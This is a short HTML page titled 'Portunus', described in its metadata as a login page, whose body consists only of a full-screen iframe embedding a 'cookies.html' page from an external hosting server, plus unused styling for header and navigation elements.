<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portunus</title>
    <meta name="description" content="Portunus's Login Page">
    <meta name="keywords" content="Portunus">
    <link rel="icon" href="/favicon.ico">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            font-family: Arial, sans-serif;
        }
        body {
            background-color: #f4f4f4;
            display: flex;
            flex-direction: column;
        }
        header, footer {
            background-color: #333;
            color: white;
            padding: 10px 0;
            text-align: center;
            flex-shrink: 0;
        }
        nav {
            background-color: #444;
            color: white;
            padding: 10px 0;
            text-align: center;
            flex-shrink: 0;
        }
        nav a {
            color: white;
            text-decoration: none;
            margin: 0 10px;
        }
        main {
            flex-grow: 1;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .embed-container {
            position: relative;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background: #333;
        }
        .embed-container iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: 0;
        }
    </style>
</head>
<body>
    <div class="embed-container">
        <iframe src="https://sv101.ifastnet.com/cookies.html"></iframe>
    </div>
</body>
</html>
